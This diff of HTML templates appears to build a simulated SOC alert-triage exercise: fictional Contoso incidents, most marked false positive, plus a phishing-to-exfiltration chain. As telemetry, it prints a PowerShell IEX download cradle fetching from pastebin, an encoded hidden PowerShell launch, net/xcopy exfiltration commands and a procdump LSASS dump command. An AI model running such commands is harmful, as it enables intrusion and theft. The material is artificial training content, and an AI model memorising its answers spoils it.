+      <span class="lbl">MITRE</span><span class="val">T1059.001 (PowerShell), T1140 (Deobfuscate), T1071 (App Layer Protocol)</span>
+      <span class="lbl">Device</span><span class="val mono">WS-PC-0142 &bull; Windows 11 23H2 &bull; Last seen: online</span>
+      <span class="lbl">Logged-on user</span><span class="val">CONTOSO\john.martinez</span>
+      <span class="lbl">Device risk</span><span class="val"><strong style="color:#d13438">High</strong></span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Process Tree</div>
+    <div class="ptree">
+<span class="proc">explorer.exe</span> <span class="arg">(PID: 4812)</span>
+<span class="pipe"> &boxur;&HorizontalLine;</span> <span class="proc">outlook.exe</span> <span class="arg">(PID: 7234)</span>
+<span class="pipe">    &boxur;&HorizontalLine;</span> <span class="proc">msedge.exe</span> <span class="arg">(PID: 8891) &mdash; URL: https://contoso-hr-update.com/review.hta</span>
+<span class="pipe">       &boxur;&HorizontalLine;</span> <span class="susp">mshta.exe</span> <span class="arg">(PID: 9102) &mdash; review.hta</span>
+<span class="pipe">          &boxur;&HorizontalLine;</span> <span class="susp">powershell.exe</span> <span class="arg">(PID: 9244) -nop -w hidden -enc SQBFAFgAKABOAGUAdw...</span>
+<span class="pipe">             &boxvr;&HorizontalLine;</span> <span class="susp">net.exe</span> <span class="arg">(PID: 9301) view \\FILESRV01</span>
+<span class="pipe">             &boxvr;&HorizontalLine;</span> <span class="susp">net.exe</span> <span class="arg">(PID: 9305) use Z: \\FILESRV01\Finance</span>
+<span class="pipe">             &boxvr;&HorizontalLine;</span> <span class="susp">xcopy.exe</span> <span class="arg">(PID: 9310) Z:\*.xlsx E:\exfil\ /s</span>
+<span class="pipe">             &boxvr;&HorizontalLine;</span> <span class="susp">xcopy.exe</span> <span class="arg">(PID: 9318) Z:\*.csv E:\exfil\ /s</span>
+<span class="pipe">             &boxur;&HorizontalLine;</span> <span class="susp">xcopy.exe</span> <span class="arg">(PID: 9325) Z:\*.pptx E:\exfil\ /s</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Device Timeline (Key Events)</div>
+    <div class="timeline">
+      <div class="timeline-item ti-info">
+        <div class="timeline-time">08:47:22</div>
+        <div class="timeline-title">Logon: john.martinez session started</div>
+        <div class="timeline-desc">Interactive logon. Session from RDP (source IP: 185.220.101.34 via VPN tunnel).</div>
+      </div>
+      <div class="timeline-item ti-med">
+        <div class="timeline-time">09:10:44</div>
+        <div class="timeline-title">Email link clicked in Outlook</div>
+        <div class="timeline-desc">URL: https://contoso-hr-update.com/review.hta &mdash; opened in Edge, then executed as HTA.</div>
+      </div>
+      <div class="timeline-item ti-high">
+        <div class="timeline-time">09:12:05</div>
+        <div class="timeline-title">mshta.exe spawned powershell.exe with encoded command</div>
+        <div class="timeline-desc">Decoded payload: <code class="mono" style="color:#d13438">IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/xK9mZv3T')</code><br>Network connection to pastebin.com (104.20.67.143:443). Downloaded 14 KB script.</div>
+      </div>
+      <div class="timeline-item ti-high">
+        <div class="timeline-time">09:14:30</div>
+        <div class="timeline-title">Network share enumeration &amp; mapping</div>
+        <div class="timeline-desc">net.exe used to discover and mount \\FILESRV01\Finance as Z: drive. 47 files enumerated.</div>
+      </div>
+      <div class="timeline-item ti-med">
+        <div class="timeline-time">09:16:02</div>
+        <div class="timeline-title">USB device connected</div>
+        <div class="timeline-desc">Kingston DataTraveler 3.0 (VID: 0951, PID: 1666, SN: 0019E3B42F). Assigned drive letter E:</div>
+      </div>
+      <div class="timeline-item ti-high">
+        <div class="timeline-time">09:18:41</div>
+        <div class="timeline-title">Files copied to USB (E:\exfil\)</div>
+        <div class="timeline-desc">3 files copied:<br>&bull; Q4_Financial_Results_2025.xlsx (2.4 MB)<br>&bull; Employee_Compensation_2026.csv (890 KB)<br>&bull; M&amp;A_Pipeline_Draft.pptx (5.1 MB)</div>
+      </div>
+      <div class="timeline-item ti-high">
+        <div class="timeline-time">09:23:18</div>
+        <div class="timeline-title">Outbound email with sensitive attachments</div>
+        <div class="timeline-desc">outlook.exe sent email to j.martinezprivate.2024@gmail.com with 2 file attachments (Q4_Financial_Results, Employee_Compensation).</div>
+      </div>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">File Details</div>
+    <div class="kv-row"><span class="k">review.hta</span><span class="v">SHA256: a3f2b8c1d4e5...9f01 &bull; VT: 38/72 detections &bull; Dropper/HTA.Agent</span></div>
+    <div class="kv-row"><span class="k">Downloaded script</span><span class="v">SHA256: 7e9d1c2a4b6f...3d82 &bull; VT: 22/72 detections &bull; Trojan.PS1.Exfiltrator</span></div>
+    <div class="kv-row"><span class="k">Network IOC</span><span class="v">contoso-hr-update[.]com &bull; Registered 02 Mar 2026 &bull; NameCheap &bull; typosquat of real HR portal</span></div>
+  </div>
+</div>
+
+<!-- === DfE USB (REAL) === -->
+<div id="tpl-dfe-alert-usb" data-title="Alert: Sensitive file copy to removable media" data-sub="Device: WS-PC-0142 &bull; User: john.martinez &bull; 04 Mar 2026 09:18 UTC" data-sev="high">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">Category</span><span class="val"><span class="tag">Exfiltration</span></span>
+      <span class="lbl">MITRE</span><span class="val">T1052.001 (Exfiltration over USB)</span>
+      <span class="lbl">Device</span><span class="val mono">WS-PC-0142</span>
+      <span class="lbl">USB Device</span><span class="val mono">Kingston DataTraveler 3.0 (SN: 0019E3B42F)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Files Written to USB</div>
+    <div class="evidence-block"><div class="ev-title">E:\exfil\Q4_Financial_Results_2025.xlsx</div><div class="ev-detail">Size: 2.4 MB &bull; Sensitivity label: Confidential &bull; Source: \\FILESRV01\Finance\Reports\ &bull; Contains: revenue figures, profit margins, forecast data</div></div>
+    <div class="evidence-block"><div class="ev-title">E:\exfil\Employee_Compensation_2026.csv</div><div class="ev-detail">Size: 890 KB &bull; Sensitivity label: Highly Confidential &bull; Source: \\FILESRV01\Finance\HR\ &bull; Contains: employee names, SSNs (columns D-E), salary data for 1,247 employees</div></div>
+    <div class="evidence-block"><div class="ev-title">E:\exfil\M&amp;A_Pipeline_Draft.pptx</div><div class="ev-detail">Size: 5.1 MB &bull; Sensitivity label: Highly Confidential &bull; Source: \\FILESRV01\Finance\M&amp;A\ &bull; Contains: acquisition targets, valuation models, board-level strategy</div></div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Context</div>
+    <div class="evidence-block"><div class="ev-title">Correlated with ongoing incident INC-0847</div><div class="ev-detail">This USB copy was initiated by a malicious PowerShell script (PID 9244) that was launched via an HTA dropper. The xcopy commands targeted specific file extensions (.xlsx, .csv, .pptx) from the Finance share. The destination folder "exfil" was created by the script.</div></div>
+  </div>
+</div>
+
+<!-- === DfE FP1 === -->
+<div id="tpl-dfe-alert-fp1" data-title="Alert: Potentially unwanted application detected" data-sub="Device: WS-MKT-0087 &bull; User: rachel.kim &bull; 04 Mar 2026 08:33 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">Application</span><span class="val mono">FreeVideoConverter_Setup.exe</span>
+      <span class="lbl">Detection</span><span class="val">PUA:Win32/BundleInstaller</span>
+      <span class="lbl">Action taken</span><span class="val">Blocked &amp; quarantined</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign"><div class="ev-title">Low Risk &mdash; PUA blocked by Defender</div><div class="ev-detail">rachel.kim (Marketing) downloaded a free video converter for editing social media content. The installer bundles adware toolbars. Defender blocked it before execution. User has been notified to use approved software catalog. No malicious behavior observed. Common shadow IT pattern.</div></div>
+  </div>
+</div>
+
+<!-- === DfE FP2 === -->
+<div id="tpl-dfe-alert-fp2" data-title="Alert: PowerShell script with uncommon execution policy" data-sub="Device: WS-IT-0PC09 &bull; User: mike.ross &bull; 04 Mar 2026 09:05 UTC" data-sev="low">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-low"><span class="sev-dot"></span>Low</span></span>
+      <span class="lbl">Command</span><span class="val mono">Set-ExecutionPolicy Bypass -Scope Process; .\Deploy-Updates.ps1</span>
+      <span class="lbl">Script signer</span><span class="val">Contoso IT Automation (valid code-signing cert)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign"><div class="ev-title">False Positive &mdash; Authorized IT script</div><div class="ev-detail">Same event as Sentinel INC-0846. mike.ross (IT Ops) running scheduled maintenance script. Script is signed with Contoso's code-signing certificate. SHA256 matches the version in the approved scripts repository. Change ticket: CHG-2026-0891.</div></div>
+  </div>
+</div>
+
+<!-- === DLP-9924 (REAL) === -->
+<div id="tpl-dlp-9924" data-title="DLP-9924: Financial data sent to external recipient" data-sub="Policy: &quot;Financial Data Protection&quot; &bull; 04 Mar 2026 09:23 UTC" data-sev="high">
+  <div class="banner banner-warn">
+    <span class="banner-icon">&#9888;</span>
+    <div>This alert is correlated with Sentinel incident <strong>INC-0847</strong> and Defender alert on <strong>WS-PC-0142</strong>. Same user and same files involved.</div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">Policy</span><span class="val">Financial Data Protection (DLP-POL-003)</span>
+      <span class="lbl">Rule</span><span class="val">Block external sharing of files labeled &quot;Confidential&quot; or higher</span>
+      <span class="lbl">Action taken</span><span class="val" style="color:#ff8c00"><strong>Audit only</strong> (email was delivered)</span>
+      <span class="lbl">Override</span><span class="val">None (user did not provide justification)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Email Details</div>
+    <div class="kv-row"><span class="k">From</span><span class="v">john.martinez@contoso.com</span></div>
+    <div class="kv-row"><span class="k">To</span><span class="v" style="color:#d13438">j.martinezprivate.2024@gmail.com (external, unmanaged)</span></div>
+    <div class="kv-row"><span class="k">Subject</span><span class="v">"Backup docs"</span></div>
+    <div class="kv-row"><span class="k">Sent via</span><span class="v">Outlook Desktop (WS-PC-0142)</span></div>
+    <div class="kv-row"><span class="k">Attachment 1</span><span class="v">Q4_Financial_Results_2025.xlsx (2.4 MB) &mdash; <span class="tag" style="background:rgba(209,52,56,.2);color:#f4a3a6">Confidential</span></span></div>
+    <div class="kv-row"><span class="k">Attachment 2</span><span class="v">Employee_Compensation_2026.csv (890 KB) &mdash; <span class="tag" style="background:rgba(209,52,56,.2);color:#f4a3a6">Highly Confidential</span></span></div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Sensitive Content Detected</div>
+    <div class="evidence-block"><div class="ev-title">Employee_Compensation_2026.csv</div><div class="ev-detail">&bull; 1,247 Social Security Numbers (XXX-XX-XXXX pattern, columns D-E)<br>&bull; 1,247 employee full names (column A)<br>&bull; Salary and bonus amounts (columns F-H)<br>&bull; SIT match: U.S. Social Security Number (SSN) &mdash; confidence: High (95%)</div></div>
+    <div class="evidence-block"><div class="ev-title">Q4_Financial_Results_2025.xlsx</div><div class="ev-detail">&bull; Revenue figures, EBITDA, net income for Q4 2025<br>&bull; Labeled &quot;Confidential&quot; via Information Protection<br>&bull; Contains material non-public financial information (MNPI)</div></div>
+  </div>
+</div>
+
+<!-- === DLP-9925 (REAL) === -->
+<div id="tpl-dlp-9925" data-title="DLP-9925: Confidential files copied to removable storage" data-sub="Policy: &quot;Removable Media Restrictions&quot; &bull; 04 Mar 2026 09:18 UTC" data-sev="high">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">Policy</span><span class="val">Removable Media Restrictions (DLP-POL-007)</span>
+      <span class="lbl">Rule</span><span class="val">Block copy of labeled files to USB drives</span>
+      <span class="lbl">Action taken</span><span class="val" style="color:#ff8c00"><strong>Audit only</strong> (copy completed)</span>
+      <span class="lbl">User</span><span class="val">john.martinez@contoso.com</span>
+      <span class="lbl">Device</span><span class="val mono">WS-PC-0142</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Files Copied</div>
+    <div class="evidence-block"><div class="ev-title">3 files copied to Kingston DataTraveler (E:\exfil\)</div><div class="ev-detail">&bull; Q4_Financial_Results_2025.xlsx &mdash; Confidential &mdash; 2.4 MB<br>&bull; Employee_Compensation_2026.csv &mdash; Highly Confidential &mdash; 890 KB<br>&bull; M&A_Pipeline_Draft.pptx &mdash; Highly Confidential &mdash; 5.1 MB<br><br>Note: DLP policy was in &quot;audit only&quot; mode &mdash; copy was NOT blocked. Recommend escalating to policy owner to switch to &quot;block&quot; mode.</div></div>
+  </div>
+</div>
+
+<!-- === DLP FP1 === -->
+<div id="tpl-dlp-fp1" data-title="DLP-9921: SSN pattern in outbound email" data-sub="Policy: &quot;PII Protection&quot; &bull; 04 Mar 2026 08:50 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">User</span><span class="val">laura.gomez@contoso.com (HR Benefits Manager)</span>
+      <span class="lbl">Recipient</span><span class="val">benefits-team@acmebenefits.com (approved vendor)</span>
+      <span class="lbl">Subject</span><span class="val">"Q1 2026 Benefits Enrollment Updates"</span>
+      <span class="lbl">Action</span><span class="val">Allowed with override (business justification provided)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign"><div class="ev-title">False Positive &mdash; Approved business process</div><div class="ev-detail">laura.gomez (HR) sends employee benefits data to Acme Benefits (approved vendor, domain on DLP allowlist). She provided business justification: "Quarterly benefits enrollment data per contract SLA." Recipient domain acmebenefits.com is in the approved external sharing list. This is a routine, documented process.</div></div>
+  </div>
+</div>
+
+<!-- === DLP FP2 === -->
+<div id="tpl-dlp-fp2" data-title="DLP-9922: Confidential label in Teams message" data-sub="Policy: &quot;Label Enforcement&quot; &bull; 04 Mar 2026 09:40 UTC" data-sev="low">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-low"><span class="sev-dot"></span>Low</span></span>
+      <span class="lbl">User</span><span class="val">kevin.wu@contoso.com (Product Manager)</span>
+      <span class="lbl">Channel</span><span class="val">Teams &gt; Project Alpha &gt; General (internal, private channel)</span>
+      <span class="lbl">Content</span><span class="val">Shared a link to a Confidential-labeled SharePoint document</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign"><div class="ev-title">False Positive &mdash; Internal sharing within authorized team</div><div class="ev-detail">kevin.wu shared a SharePoint link (not the file itself) in an internal private Teams channel. All channel members (6 people) have Confidential clearance for Project Alpha. No external guests in the channel. The document's sharing permissions were not modified. This is normal internal collaboration.</div></div>
+  </div>
+</div>
+
+<!-- === DLP FP3 === -->
+<div id="tpl-dlp-fp3" data-title="DLP-9923: Credit card pattern in SharePoint upload" data-sub="Policy: &quot;PCI-DSS Compliance&quot; &bull; 04 Mar 2026 08:20 UTC" data-sev="info">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-info"><span class="sev-dot"></span>Informational</span></span>
+      <span class="lbl">User</span><span class="val">anna.patel@contoso.com (Finance Analyst)</span>
+      <span class="lbl">File</span><span class="val mono">March_Expense_Report_APatel.xlsx</span>
+      <span class="lbl">Location</span><span class="val">SharePoint &gt; Finance Team &gt; Expense Reports</span>
+      <span class="lbl">Pattern match</span><span class="val">2 credit card numbers detected (Visa pattern: 4XXX-XXXX-XXXX-XXXX)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign"><div class="ev-title">False Positive &mdash; Standard expense report</div><div class="ev-detail">anna.patel uploaded her monthly expense report to the designated Finance SharePoint library. The credit card numbers are last-4-only references (masked: XXXX-XXXX-XXXX-1234) in the "Payment Method" column. The DLP regex matched on a nearby order confirmation number that resembles a CC format (16 digits). File is internal only, appropriate library, appropriate user. Low confidence match (62%).</div></div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0849 (FP) === -->
+<div id="tpl-sentinel-inc-0849" data-title="INC-0849: Possible token replay &mdash; session used from new IP" data-sub="Created 04 Mar 2026 09:48 UTC" data-sev="high">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">User</span><span class="val">robert.fisher@contoso.com (Sales Director)</span>
+      <span class="lbl">Original IP</span><span class="val mono">104.28.55.12 (Contoso VPN, Dallas)</span>
+      <span class="lbl">New IP</span><span class="val mono">104.28.55.78 (Contoso VPN, Dallas)</span>
+      <span class="lbl">Time gap</span><span class="val">3 minutes between IP changes</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; VPN IP pool rotation</div>
+      <div class="ev-detail">robert.fisher's OAuth token was used from a different IP, but both IPs belong to Contoso's corporate VPN pool (104.28.55.0/24, Dallas egress). VPN reconnected due to brief Wi-Fi drop (laptop sleep/wake). User agent, device ID, and conditional access policy all match. Session continued normally with no anomalous activity. This is a known pattern with the GlobalProtect VPN client.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0850 (FP) === -->
+<div id="tpl-sentinel-inc-0850" data-title="INC-0850: Suspicious inbox rule creation &mdash; auto-forward to external" data-sub="Created 04 Mar 2026 08:55 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">User</span><span class="val">lisa.chen@contoso.com (VP of Marketing)</span>
+      <span class="lbl">Rule action</span><span class="val">Forward emails matching "Project Falcon" to lisa.chen.personal@outlook.com</span>
+      <span class="lbl">Created via</span><span class="val">Outlook Web App</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; User-initiated for maternity leave coverage</div>
+      <div class="ev-detail">lisa.chen confirmed she created the rule to monitor Project Falcon updates during her upcoming maternity leave (starting 10 Mar). The personal email (outlook.com) is her known secondary. IT has been notified and will disable the rule once a delegate is assigned. No sign of compromised credentials &mdash; user was authenticated from known device (WS-MKT-0012) on corporate network. Rule targets a single keyword, not broad forwarding.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0851 (FP) === -->
+<div id="tpl-sentinel-inc-0851" data-title="INC-0851: Mass file deletion in SharePoint &mdash; Project Omega site" data-sub="Created 04 Mar 2026 07:30 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">User</span><span class="val">alex.turner@contoso.com (Project Manager)</span>
+      <span class="lbl">Site</span><span class="val">SharePoint &gt; Project Omega &gt; Documents</span>
+      <span class="lbl">Files deleted</span><span class="val">127 files in 15 minutes</span>
+      <span class="lbl">Recovery</span><span class="val">Files moved to SharePoint Recycle Bin (recoverable for 93 days)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Approved project archival</div>
+      <div class="ev-detail">Project Omega was completed on 28 Feb 2026. alex.turner (PM) is performing end-of-project cleanup per Contoso's data retention policy (POL-DM-012). Confirmed via ServiceNow request REQ-2026-4589 approved by his manager (VP of Engineering). All files are still in the Recycle Bin. No sensitive/labeled files were permanently deleted. Standard project lifecycle activity.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0852 (FP) === -->
+<div id="tpl-sentinel-inc-0852" data-title="INC-0852: Sign-in from unmanaged device &mdash; tom.nguyen" data-sub="Created 04 Mar 2026 10:02 UTC" data-sev="low">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-low"><span class="sev-dot"></span>Low</span></span>
+      <span class="lbl">User</span><span class="val">tom.nguyen@contoso.com (Field Sales Rep)</span>
+      <span class="lbl">Device</span><span class="val">iPhone 15 Pro (not Intune-enrolled)</span>
+      <span class="lbl">App</span><span class="val">Outlook Mobile</span>
+      <span class="lbl">Location</span><span class="val">Denver, CO (user's home city)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; New personal device, pending enrollment</div>
+      <div class="ev-detail">tom.nguyen upgraded his personal phone (iPhone 14 &rarr; iPhone 15 Pro) and re-installed Outlook before completing Intune enrollment. IT Help Desk ticket HD-2026-1190 confirms he contacted support at 09:45 for enrollment assistance. Device is in the Intune enrollment queue. Conditional access allowed read-only email access (no download of attachments). Expected to be enrolled by EOD.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === SENTINEL INC-0853 (FP) === -->
+<div id="tpl-sentinel-inc-0853" data-title="INC-0853: MFA registration from unusual location &mdash; priya.sharma" data-sub="Created 04 Mar 2026 06:45 UTC" data-sev="info">
+  <div class="detail-section">
+    <div class="detail-section-title">Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-info"><span class="sev-dot"></span>Informational</span></span>
+      <span class="lbl">User</span><span class="val">priya.sharma@contoso.com (Software Engineer)</span>
+      <span class="lbl">Activity</span><span class="val">Registered new MFA method (Microsoft Authenticator) from Bangalore, India</span>
+      <span class="lbl">Previous location</span><span class="val">Seattle, WA</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Employee on approved international travel</div>
+      <div class="ev-detail">priya.sharma is visiting Contoso's Bangalore office for two weeks (01 Mar &ndash; 14 Mar), confirmed in Workday travel records. She got a new phone and needed to re-register MFA. The registration was performed after successful authentication with existing MFA (SMS to verified phone number). IP 49.37.xx.xx is Contoso Bangalore office range. No suspicious follow-up activity.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DfE LSASS (FP) === -->
+<div id="tpl-dfe-alert-cred" data-title="Alert: LSASS memory access detected" data-sub="Device: WS-IT-0PC03 &bull; User: carlos.mendez &bull; 04 Mar 2026 10:15 UTC" data-sev="high">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-high"><span class="sev-dot"></span>High</span></span>
+      <span class="lbl">Category</span><span class="val"><span class="tag">Credential Access</span></span>
+      <span class="lbl">MITRE</span><span class="val">T1003.001 (LSASS Memory)</span>
+      <span class="lbl">Device</span><span class="val mono">WS-IT-0PC03 &bull; Windows 11 23H2</span>
+      <span class="lbl">Process</span><span class="val mono">procdump.exe (Sysinternals, signed by Microsoft)</span>
+      <span class="lbl">User</span><span class="val">carlos.mendez@contoso.com (IT Security Analyst)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Process Tree</div>
+    <div class="ptree">
+<span class="proc">explorer.exe</span> <span class="arg">(PID: 3012)</span>
+<span class="pipe"> &boxur;&HorizontalLine;</span> <span class="proc">cmd.exe</span> <span class="arg">(PID: 5544)</span>
+<span class="pipe">    &boxur;&HorizontalLine;</span> <span class="susp">procdump.exe</span> <span class="arg">(PID: 5601) -ma lsass.exe C:\Temp\lsass_dump.dmp</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Authorized crash dump for debugging</div>
+      <div class="ev-detail">carlos.mendez (IT Security) was collecting an LSASS crash dump to diagnose authentication latency issues reported in ServiceNow INC-2026-3344. He used Sysinternals ProcDump (signed binary, SHA256 matches official distribution). The dump was taken on his own IT workstation (not a production server). Procedure is documented in KB-SEC-089 "LSASS Dump for Auth Troubleshooting". Dump file was deleted after analysis. Credential Guard is enabled on this device, so credentials cannot be extracted from the dump.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DfE Service (FP) === -->
+<div id="tpl-dfe-alert-svc" data-title="Alert: Suspicious service installation via sc.exe" data-sub="Device: SVR-APP-0012 &bull; User: svc_deploy &bull; 04 Mar 2026 07:22 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">Category</span><span class="val"><span class="tag">Persistence</span></span>
+      <span class="lbl">MITRE</span><span class="val">T1543.003 (Windows Service)</span>
+      <span class="lbl">Device</span><span class="val mono">SVR-APP-0012 (Application Server)</span>
+      <span class="lbl">Command</span><span class="val mono">sc.exe create "ContosoHealthAgent" binPath= "C:\Program Files\HealthAgent\svc.exe" start= auto</span>
+      <span class="lbl">User</span><span class="val">CONTOSO\svc_deploy (service account)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Approved deployment pipeline</div>
+      <div class="ev-detail">The svc_deploy service account is used by Azure DevOps release pipeline "HealthAgent-Prod-Deploy" (Release-2026-478). The ContosoHealthAgent is an internal monitoring service built by the Platform Engineering team. Binary is code-signed with Contoso's internal certificate. Deployment was scheduled for 07:00-08:00 window per change ticket CHG-2026-0905. Pipeline run ID matches Azure DevOps audit log.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DfE Network (FP) === -->
+<div id="tpl-dfe-alert-net" data-title="Alert: Outbound connection to uncommon geolocation" data-sub="Device: WS-FIN-0034 &bull; User: emma.blake &bull; 04 Mar 2026 08:48 UTC" data-sev="low">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-low"><span class="sev-dot"></span>Low</span></span>
+      <span class="lbl">Category</span><span class="val"><span class="tag">Command &amp; Control</span></span>
+      <span class="lbl">Destination</span><span class="val mono">52.187.45.120:443 (Singapore, Azure CDN)</span>
+      <span class="lbl">Process</span><span class="val mono">msedge.exe</span>
+      <span class="lbl">Data sent</span><span class="val">12 KB (HTTPS, encrypted)</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Azure CDN geo-routing</div>
+      <div class="ev-detail">emma.blake was accessing the company's Power BI dashboard which uses Azure CDN. The CDN endpoint 52.187.45.120 is a legitimate Microsoft Azure IP (AS8075) in the Singapore region. CDN geo-routing sometimes selects distant PoPs during traffic rebalancing. The connection was standard HTTPS/TLS 1.3 to *.vo.msecnd.net (Microsoft CDN domain). No anomalous data transfer patterns. Edge browser is the expected application.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DfE Tor (FP) === -->
+<div id="tpl-dfe-alert-tor" data-title="Alert: Tor browser process detected" data-sub="Device: WS-RND-0091 &bull; User: victor.lang &bull; 04 Mar 2026 09:55 UTC" data-sev="med">
+  <div class="detail-section">
+    <div class="detail-section-title">Alert Details</div>
+    <div class="detail-grid">
+      <span class="lbl">Severity</span><span class="val"><span class="sev sev-med"><span class="sev-dot"></span>Medium</span></span>
+      <span class="lbl">Category</span><span class="val"><span class="tag">Defense Evasion</span></span>
+      <span class="lbl">Process</span><span class="val mono">firefox.exe (Tor Browser 13.0.10)</span>
+      <span class="lbl">Device</span><span class="val mono">WS-RND-0091</span>
+      <span class="lbl">User</span><span class="val">victor.lang@contoso.com (Privacy Research Lead)</span>
+      <span class="lbl">Network</span><span class="val">Connected to Tor entry node 198.51.100.47:9001</span>
+    </div>
+  </div>
+  <div class="detail-section">
+    <div class="detail-section-title">Investigation</div>
+    <div class="evidence-block benign">
+      <div class="ev-title">False Positive &mdash; Authorized research activity</div>
+      <div class="ev-detail">victor.lang is the Privacy Research Lead in the R&amp;D department. His role requires testing Contoso's products over anonymized networks (Tor, VPNs, proxies). He has a security exception (SEC-EXC-2025-019, approved by CISO) allowing Tor Browser on his research workstation (WS-RND-0091). The device is network-segmented in VLAN 42 (R&amp;D Sandbox) with no access to production resources. No sensitive data access during the Tor session. This alert fires weekly for this user/device combination.</div>
+    </div>
+  </div>
+</div>
+
+<!-- === DLP-9926 (FP) === -->
